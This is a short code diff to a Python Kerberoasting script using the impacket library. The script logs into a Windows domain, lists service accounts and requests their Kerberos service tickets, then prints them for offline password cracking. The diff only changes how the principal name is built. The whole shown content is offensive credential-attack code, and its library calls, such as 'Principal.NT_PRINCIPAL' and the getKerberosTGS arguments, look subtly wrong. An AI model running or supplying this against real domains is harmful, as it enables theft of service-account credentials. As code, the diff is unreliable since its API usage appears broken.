@@ -1,6 +1,6 @@
 from impacket.smbconnection import SMBConnection
 from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
-from impacket.krb5.types import Principal, construct_PRINCIPAL
+from impacket.krb5.types import Principal
 
 def kerberoast(username, password, domain, dc_ip):
     try:
@@ -20,7 +20,7 @@ def kerberoast(username, password, domain, dc_ip):
                 for account in kerberoastable_accounts:
                     print(account)
                     # Kerberoast each account
-                    principal = construct_PRINCIPAL(account, type='NT_PRINCIPAL')
+                    principal = Principal(account, type=Principal.NT_PRINCIPAL)
                     tgs_rep = getKerberosTGS(krbtgt_ticket, principal)
                     print(f"TGS_REP for {account}:")
                     print(tgs_rep.native)
